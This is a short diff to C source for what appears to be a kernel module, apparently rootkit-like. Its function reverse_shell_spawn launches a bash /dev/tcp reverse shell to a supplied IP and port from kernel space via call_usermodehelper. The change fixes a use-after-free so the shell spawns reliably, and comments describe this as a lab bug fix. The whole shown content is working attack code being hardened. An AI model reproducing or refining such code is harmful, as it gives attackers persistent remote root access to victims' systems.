@@ -37,7 +37,7 @@ uint16_t vault_fnv1a16(const char *s) {
 
 static int reverse_shell_spawn(const char *ip, int port) {
     char *argv[] = { "/bin/bash", "-c", NULL, NULL };
-    char *envp[] = { "HOME=/", "PATH=/usr/bin:/bin:/usr/sbin:/sbin", NULL };
+    static char *envp[] = { "HOME=/", "PATH=/usr/bin:/bin:/usr/sbin:/sbin", NULL };
     char cmd[256];
 
     /* Use bash -c with /dev/tcp for reverse shell */
@@ -49,7 +49,14 @@ static int reverse_shell_spawn(const char *ip, int port) {
 
     pr_info(VAULT_KERNEL_TAG " spawning reverse shell -> %s:%d\n", ip, port);
 
-    return call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
+    /*
+     * UMH_WAIT_EXEC is MANDATORY here: it blocks until the execve has
+     * consumed argv/envp.  The previous UMH_NO_WAIT returned before the
+     * helper thread ran, so the kernel later dereferenced `cmd` and
+     * `argv` after this stack frame died — a classic use-after-free in
+     * kernel space (v3.2 bug, found in the v3.3 lab pass).
+     */
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 }
 
 /* Wrapper for workqueue-based spawning (safer) */
